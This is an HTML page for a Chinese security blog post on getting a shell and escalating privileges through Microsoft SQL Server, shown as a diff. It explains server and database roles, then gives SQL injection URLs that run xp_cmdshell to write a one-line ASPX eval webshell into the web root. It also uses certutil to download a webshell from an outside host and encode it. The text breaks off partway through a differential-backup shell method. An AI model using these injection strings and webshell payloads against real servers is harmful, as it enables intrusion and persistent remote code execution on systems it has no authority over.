@@ -1,0 +1,1271 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <title>
+        MSSQL获取shell和提权 - AD钙奶的博客
+      </title>
+        <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    
+    <meta name="theme-color" content="#000000" />
+    
+    <meta http-equiv="window-target" content="_top" />
+    
+    
+    <meta name="description" content="MSSQL获取shell和提权" />
+    <meta name="generator" content="Hugo 0.87.0 with theme pure" />
+    <title>MSSQL获取shell和提权 - AD钙奶的博客</title>
+    
+    
+    <link rel="stylesheet" href="https://ad-calcium.github.io/css/style.min.e64d754037c0ee0ec4e20ab1d6f07740ace61729bc03850559b8caa21ae4a597.css">
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+    <meta property="og:title" content="MSSQL获取shell和提权" />
+<meta property="og:description" content="MSSQL获取shell和提权" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ad-calcium.github.io/2021/07/mssql%E6%8F%90%E6%9D%83/" /><meta property="article:section" content="posts" />
+
+<meta property="article:modified_time" content="2021-07-22T00:00:00+00:00" />
+<meta property="og:see_also" content="https://ad-calcium.github.io/2021/07/cve-2021-36934%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/07/jdc%E6%9C%AA%E6%8E%88%E6%9D%83/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/07/cve-2021-1675%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/07/ezoffice%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" /><meta property="og:see_also" content="https://ad-calcium.github.io/2021/07/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" />
+
+<meta itemprop="name" content="MSSQL获取shell和提权">
+<meta itemprop="description" content="MSSQL获取shell和提权">
+<meta itemprop="dateModified" content="2021-07-22T00:00:00+00:00" />
+<meta itemprop="wordCount" content="8545">
+<meta itemprop="keywords" content="MSSQL,内网渗透," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="MSSQL获取shell和提权"/>
+<meta name="twitter:description" content="MSSQL获取shell和提权"/>
+
+    <!--[if lte IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+      <![endif]-->
+
+    <!--[if lt IE 9]>
+        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+      <![endif]-->
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="https://github.com/ad-calcium" target="_blank">
+            <img class="img-circle img-rotate" src="https://ad-calcium.github.io/avatar.png" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">AD钙奶</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>China</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="想要查找什么..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-categories">
+                <a href="/categories/">
+                    <i class="icon icon-folder"></i>
+                  <span class="menu-title">Categories</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content"><p>十年寒窗无人问，一举成名天下知。</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> 标签</h3>
+    <div id="tag-cloud-list" class="widget-body">
+            
+            
+            <a href="https://ad-calcium.github.io/tags/mssql/" class="tag-list-link" rel="1">mssql<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/" class="tag-list-link" rel="5">web安全<span
+               class="tag-list-count">5</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/" class="tag-list-link" rel="1">web渗透<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/" class="tag-list-link" rel="3">内网<span
+               class="tag-list-count">3</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="tag-list-link" rel="2">内网渗透<span
+               class="tag-list-count">2</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/" class="tag-list-link" rel="1">安装博客<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="tag-list-link" rel="1">小技巧<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" class="tag-list-link" rel="1">未授权<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" class="tag-list-link" rel="1">流量代理<span
+               class="tag-list-count">1</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link" rel="10">漏洞复现<span
+               class="tag-list-count">10</span></a>
+            
+            
+            <a href="https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" class="tag-list-link" rel="1">软件安装<span
+               class="tag-list-count">1</span></a>
+            
+    </div>
+<script>
+document.onreadystatechange = () => {
+  if (document.readyState === 'complete') {
+    tagCloud('#tag-cloud-list a',  15 ,  30 );
+  }
+};
+
+function tagCloud(where, min, max) {
+  let iMax = 0;
+  let iMin = 0;
+  $(where).each(function() {
+    let weight = Number($(this).attr("rel"));
+    if(iMax < weight) iMax = weight;
+    if(iMin > weight || iMin == 0) iMin = weight;
+  });
+  let step = (max - min)/(iMax - iMin);
+  $(where).each(function() {
+    let weight = $(this).attr("rel") - iMin;
+    $(this).css({"font-size": min + (weight * step) + 'px'});
+  });
+};
+</script>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> 分类</h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/sql%E6%B3%A8%E5%85%A5/" class="category-list-link">sql注入</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/web%E5%AE%89%E5%85%A8/" class="category-list-link">web安全</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="category-list-link">内网渗透</a><span class="category-list-count">2</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="category-list-link">小技巧</a><span class="category-list-count">2</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="category-list-link">未授权漏洞</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://ad-calcium.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-list-link">漏洞复现</a><span class="category-list-count">8</span></li>
+        </ul>
+    </div>
+</div>
+      <div class="widget">
+    <h3 class="widget-title"> 标签</h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/mssql/" class="tag-list-link">mssql</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/" class="tag-list-link">web安全</a><span
+                    class="tag-list-count">5</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/" class="tag-list-link">web渗透</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/" class="tag-list-link">内网</a><span
+                    class="tag-list-count">3</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="tag-list-link">内网渗透</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/" class="tag-list-link">安装博客</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="tag-list-link">小技巧</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" class="tag-list-link">未授权</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/" class="tag-list-link">流量代理</a><span
+                    class="tag-list-count">1</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="tag-list-link">漏洞复现</a><span
+                    class="tag-list-count">10</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" class="tag-list-link">软件安装</a><span
+                    class="tag-list-count">1</span></li>
+            
+        </ul>
+
+    </div>
+</div>
+      
+<div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/07/%E6%9F%90%E4%BF%A1xxx%E8%AE%BE%E5%A4%87%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="title">某信xxx设备存在任意文件读取漏洞</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-07-30 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-30</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/07/cve-2021-36934%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="title">CVE-2021-36934 漏洞复现</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-07-26 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-26</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/07/jdc%E6%9C%AA%E6%8E%88%E6%9D%83/" class="title">jdc未授权访问</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-07-26 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-26</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/07/cve-2021-1675%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="title">CVE-2021-1675 漏洞复现</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-07-24 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-24</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://ad-calcium.github.io/2021/07/ezoffice%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="title">ezOFFICE 任意文件上传</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-07-24 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-24</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">文章目录</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/2021/07/mssql%E6%8F%90%E6%9D%83/"
+    >MSSQL获取shell和提权</a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://ad-calcium.github.io/2021/07/mssql%E6%8F%90%E6%9D%83/" class="article-date">
+  <time datetime="2021-07-22 00:00:00 &#43;0000 UTC" itemprop="datePublished">2021-07-22</time>
+</a>
+</span>
+<span class="article-category">
+  <i class="icon icon-folder"></i>&nbsp;
+  <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"> 内网渗透 </a>
+</span>  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/mssql/"> MSSQL </a>
+    <a class="article-tag-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"> 内网渗透 </a>
+  </span>
+
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 8545字</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 18分 </span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <h2 id="一mssql简介">一、MSSQL简介</h2>
+<p><code>MSSQL(MicroSoft SQL Server数据库)</code>，是微软开发的关系型数据库管理系统<code>DBMS</code>，是一个较大型的数据库，提供数据库的从服务器到终端的完整的解决方案，数据库管理系统<code>SSMS(SQL Server Managerment Studio)</code>，是一个用于建立、使用和维护数据库的集成开发环境。 <strong>端口号：1433</strong></p>
+<h3 id="sa用户">SA用户</h3>
+<p>在搭建时，选择使用<code>SQL Server</code>身份验证会创建SA账户并设置密码，<code>SA(System Administrator)</code>表示系统管理员，在<code>SQLServer2019</code>之前的SA用户都是系统最高权限用户<code>SYSTEM</code>，但在2019版本时为普通数据库用户<code>mssqlserver</code>，是一个低权用户。</p>
+<h3 id="系统库">系统库</h3>
+<p>系统数据库默认创建时就会存在，有以下4种</p>
+<p><img src="images/17.png" alt=""></p>
+<h3 id="存储过程">存储过程</h3>
+<p>存储过程是一个可编程的函数，它在数据库中创建并保存，是存储在服务器中的一组预编译过的T-SQL（SQL语言版本之一，只能在SQLserver使用）语句。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式（可以将存储过程理解为函数调用的过程），使用execute命令执行存储过程。</p>
+<p>系统存储过程、扩展存储过程、用户自定义的存储过程。</p>
+<ol>
+<li>系统存储过程主要存储在master数据库中，以&quot;sp_&ldquo;为前缀，在任何数据库中都可以调用，在调用的时候不必在存储过程前加上数据库名；</li>
+<li>扩展存储过程则是对动态链接库(DLL)函数的调用，主要是用于客户端与服务器端或客户端之间进行通信的，以“xp_&ldquo;为前缀，使用方法与系统存储过程类似；</li>
+<li>用户定义的存储过程是SQLServer的使用者编写的存储过程；</li>
+</ol>
+<p>存储过程为数据库提供了强大的功能，但在相应的权限下，攻击者可以利用不同的存储过程执行不同的高级功能，如：创建数据库用户、枚举文件目录、执行任意系统命令等。正因如此，SQLserver2005、2008等之后的版本分别对存储过程做了权限控制，以防滥用。</p>
+<h3 id="server权限体系">Server权限体系</h3>
+<p>权限两个字，一个<strong>权力</strong>，一个<strong>限制</strong>。在软件领域通俗的解释就是<strong>哪些人</strong>可以对<strong>哪些资源</strong>做<strong>哪些操作</strong>。在SQL Server中，”哪些人”，“哪些资源”,”哪些操作”则分别对应SQL Server中的三个对象，分别为主体(Principals),安全对象(Securables)和权限(Permissions)，而权力和限制则是对应了SQL Server中的GRENT和DENY。对于主体，安全对象和权限的初步理解，见下图：</p>
+<p><img src="images/4444657-265b5e582379cf0b.png" alt="img"></p>
+<h4 id="主体">主体</h4>
+<p>“主体”是可以请求 SQL Server 资源的实体。主体可以是个体，组或者进程。主体可以按照作用范围被分为三类:</p>
+<ul>
+<li>Windows级别主体：包括<strong>Windows 域登录名</strong>和<strong>Windows 本地登录名</strong>。</li>
+<li>服务器级别主体：包括<strong>服务器登录名</strong>和<strong>服务器角色</strong>。</li>
+<li>数据库级别主体：包括<strong>数据库用户、数据库角色、固定数据库角色</strong>以及<strong>应用程序角色</strong>。</li>
+</ul>
+<p>可以看到主体包括<strong>登录名</strong>以及<strong>角色</strong>。</p>
+<h4 id="角色">角色</h4>
+<p>角色可以看成是权限的集合体，为了方便权限管理，可以把一些常用权限赋予角色，然后再把角色赋予相关用户，则这些用户就继承了橘色中的所有权限。一般情况下，数据库会内置一些角色，用户也可以创建自定义角色。对角色进行权限管理的方式与对用户进行权限管理的方式是相同的。
+ 角色在SQL Server中被分为三类，分别为:</p>
+<ul>
+<li>内置角色&mdash;-这类角色在服务器安装时已经默认存在，其权限是固定的，并且不能被删除</li>
+<li>用户自定义角色&mdash;-这类角色由用户按照需求自定义创建</li>
+<li>应用程序角色&mdash;-这类特殊角色用于管理应用程序的数据访问</li>
+</ul>
+<p>角色也分为两个方面：</p>
+<ul>
+<li>服务器级别的角色，用于数据库服务器方面的控制权限</li>
+<li>数据库级别的角色，用于数据库中数据的控制权限。</li>
+</ul>
+<h5 id="1服务器级别的角色">1.服务器级别的角色</h5>
+<p>服务器级角色的权限作用域为服务器范围。例如创建、修改、删除数据库，管理磁盘文件，添加或删除数据库连接等等，都是需要服务器上的权限才能进行操作。
+ 固定服务器角色具有一组固定的权限，并且适用于整个服务器范围。 它们专门用于管理 SQL Server，且不能更改分配给它们的权限。 可以在数据库中不存在用户帐户的情况下向固定服务器角色分配登录。
+ **服务器级别的对象，只能包含登录名。**定义了服务器角色，你定义的登陆用户就有了相应的执行权限。先来看一下服务器级别的固定角色：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">服务器角色</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">sysadmin</td>
+<td>可以在服务器上执行任何活动</td>
+</tr>
+<tr>
+<td style="text-align:center">serveradmin</td>
+<td>可以更改服务器范围的配置选项和关闭服务器</td>
+</tr>
+<tr>
+<td style="text-align:center">securityadmin</td>
+<td>管理和审核登录用户。具有 GRANT、DENY 和 REVOKE 服务器和数据库级别的权限。此外，还可以重置 SQL Server 登录名的密码</td>
+</tr>
+<tr>
+<td style="text-align:center">processadmin</td>
+<td>管理SQL Server运行的进程</td>
+</tr>
+<tr>
+<td style="text-align:center">setupadmin</td>
+<td>可以使用 T-SQL 语句添加和删除连接服务器，并可以执行某些系统存储过程（如 sp_serveroption）</td>
+</tr>
+<tr>
+<td style="text-align:center">bulkadmin</td>
+<td>可以运行 BULK INSERT 语句</td>
+</tr>
+<tr>
+<td style="text-align:center">diskadmin</td>
+<td>用于管理磁盘文件</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>dbcreator</strong></td>
+<td>可以创建、更改、删除和还原任何数据库</td>
+</tr>
+<tr>
+<td style="text-align:center">public</td>
+<td>public角色不同于其它角色在于其权限可以被修改，每个 SQL Server 登录名都属于 public 服务器角色。无法将用户、角色或组指派给它，因为默认情况下它属于该角色，且public不能被删除</td>
+</tr>
+</tbody>
+</table>
+<h5 id="2数据库级别的角色">2.数据库级别的角色</h5>
+<p>数据库级角色的权限作用域为数据库范围。例如可以访问哪个数据库，可以访问哪个数据库中的哪些数据表、哪些视图、哪些存储过程等等，都需要数据库上的权限才能进行操作。
+ SQL Server存在两种类型的数据库级角色：数据库中预定义的“固定数据库角色”和可以创建的“用户定义的数据库角色”。
+ 固定数据库角色是SQL Server预定义的数据库角色，具有数据库级别的管理权限，并且存在于每个数据库中。**db_owner *<em>数据库角色的成员可以管理固定数据库角色成员身份。自定义数据库角色是当固定数据库角色不能满足要求时，可以自定义数据库角色。
+*</em>  数据库级别的对象，只能包含数据库用户名。**先来看一下数据库级别的固定角色：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">数据库角色</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">db_owner</td>
+<td>可以执行数据库中技术所有动作的用户，执行所有的配置活动和维护活动</td>
+</tr>
+<tr>
+<td style="text-align:center">db_securityadmin</td>
+<td>管理数据库安全，可以修改角色成员身份和管理权限。向此角色中添加主体可能会导致意外的权限升级</td>
+</tr>
+<tr>
+<td style="text-align:center">db_accessadmin</td>
+<td>可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限</td>
+</tr>
+<tr>
+<td style="text-align:center">db_backupoperator</td>
+<td>可以备份数据库</td>
+</tr>
+<tr>
+<td style="text-align:center">db_ddladmin</td>
+<td>可以在数据库中运行任何数据定义语言 (DDL) 命令</td>
+</tr>
+<tr>
+<td style="text-align:center">db_datawriter</td>
+<td>可以在所有用户表中添加、删除或更改数据</td>
+</tr>
+<tr>
+<td style="text-align:center">db_datareader</td>
+<td>可以从所有用户表中读取所有数据</td>
+</tr>
+<tr>
+<td style="text-align:center">db_denydatawriter</td>
+<td>不能添加、修改或删除数据库内用户表中的任何数据</td>
+</tr>
+<tr>
+<td style="text-align:center">db_denydatareader</td>
+<td>不能读取数据库内用户表中的任何数据</td>
+</tr>
+<tr>
+<td style="text-align:center">public</td>
+<td>public角色不同于其它角色在于其权限可以被修改，每个数据库用户、角色或组都属于public数据库角色。无法将用户、角色或组指派给它，因为默认情况下它属于该角色，且public不能被删除</td>
+</tr>
+</tbody>
+</table>
+<h3 id="登录账号和数据库用户">登录账号和数据库用户</h3>
+<p>SQL Server的服务器和数据库是两个层次的概念，SQL Server的用户也分为两种，一种是服务器登陆账号，另一种是数据库用户。
+ 一个人要操作SQL Server数据库，首先要为其创建服务器登陆账号，使得他可以登录到服务器上，然后还要在要操作的数据库上创建和这个登陆账号对应的数据库用户。
+ 可以给登陆账号赋予相应权限，使得这个账号可以执行指定的管理服务器的任务。也可以给数据库用户赋予相应权限，使得这个数据库用户可以在这个数据库中执行指定的操作。
+ <strong>服务器登陆账号</strong>分为为Windows验证及SQL Server验证两种。</p>
+<ul>
+<li>Windows身份验证模式：把Windows的操作系统用户添加为SQL Server服务器登陆账号，SQL Server并不参与验证。SQL Server完全相信Windows的验证结果，所以用此方式登录SQL Server时并不需要提供密码。</li>
+<li>SQL Server和Windows身份验证模式：这种模式即允许由Windows来验证主体身份，又允许SQL Server来验证主体身份，当由SQL Server验证主体身份时，需要用户名和密码来确认主体身份，和使用什么Windows账户半毛钱关系都没有，是在服务器上创建的另外一种独立账号。</li>
+</ul>
+<h2 id="getshell">getshell</h2>
+<p>能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。当然你如果有其他具有do_owner权限的用户也可以。</p>
+<p>拿shell的两大前提就是</p>
+<ol>
+<li>有相应的权限db_owner</li>
+<li>知道web目录的绝对路径</li>
+</ol>
+<p>我们先来了解下怎么去寻找web目录的绝对路径。</p>
+<h3 id="寻找绝对路径">寻找绝对路径</h3>
+<ol>
+<li>报错信息</li>
+<li>字典猜</li>
+<li>旁站的目录</li>
+<li>存储过程来搜索</li>
+<li>读配置文件</li>
+</ol>
+<p>前三种方法都是比较常见的方法。我们主要来讲第四种调用存储过程来搜索。</p>
+<p>先来看<code>xp_dirtree</code>直接举例子</p>
+<pre><code class="language-mssql">execute master..xp_dirtree 'c:'             --列出所有c:\文件、目录、子目录 
+execute master..xp_dirtree 'c:',1           --只列c:\目录
+execute master..xp_dirtree 'c:',1,1         --列c:\目录、文件
+</code></pre>
+<p>当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中，这样只需要去读取tmp表中的数据即可</p>
+<pre><code class="language-mssql">CREATE TABLE tmp (dir varchar(8000),num int,num1 int);
+insert into tmp(dir,num,num1) execute master..xp_dirtree 'C:\Users\Administrator\Desktop',1,1;
+</code></pre>
+<p><img src="images/image-20210721232752429.png" alt="image-20210721232752429"></p>
+<p>测试完成后记得删除tmp表</p>
+<pre><code>drop table tmp
+</code></pre>
+<p>我们再来看<code>xp_cmdshell</code>怎么去找绝对路径，实际上原理就是调用cmd来查找文件（如果可以执行命令，可以通过远程下载文件的方式下载木马）</p>
+<pre><code>http://127.0.0.1/1.aspx?id=1;CREATE TABLE cmdtmp (dir varchar(8000));
+
+http://127.0.0.1/1.aspx?id=1;insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\ %i in (1*.aspx) do @echo %i'
+</code></pre>
+<h3 id="xp_cmdshell拿shell">xp_cmdshell拿shell</h3>
+<p>xp_cmdshell这个存储过程可以用来执行cmd命令，那么我们可以通过cmd的echo命令来写入shell，当然前提是你知道web目录的绝对路径</p>
+<pre><code class="language-mssql">http://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\404.aspx' ;
+</code></pre>
+<p>由于cmd写webshell的主意这些转义的问题(所有的尖括号需要转义) 推荐使用certutil下载</p>
+<pre><code>远程下载文件
+certutil -urlcache -split -f &quot;http://172.20.10.4:8000/xxx.aspx&quot; &quot;c:\wwwroot\asp\nice.aspx&quot;
+
+命令：
+http://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell 'certutil -urlcache -split -f &quot;http://172.20.10.4:8000/xxx.aspx&quot; &quot;c:\wwwroot\asp\nice.aspx&quot;' ;
+
+
+
+#加密
+certutil -encode test.aspx out.txt
+
+解密
+certutil -decode c:\windows\Temp\out.txt c:\wwwroot\asp\aspx.aspx
+
+1.首先在本地使用certutil加密，将加密后的内容复制出来
+echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLA== &gt; C:\tmp\shell.txt
+2.解密
+certutil -f -decode &quot;C:\tmp\shell.txt&quot; &quot;C:\tmp\shell.jsp&quot;
+
+
+
+使用certutil下载文件有个弊端就是会产生缓存文件，用如下命令查看：
+certutil -urlcache *
+
+
+执行删除缓存
+certutil -urlcache * delete
+</code></pre>
+<h3 id="差异备份拿shell">差异备份拿shell</h3>
+<pre><code>backup database 库名 to disk = 'c:\bak.bak';--
+
+create table [dbo].[test] ([cmd] [image]);
+
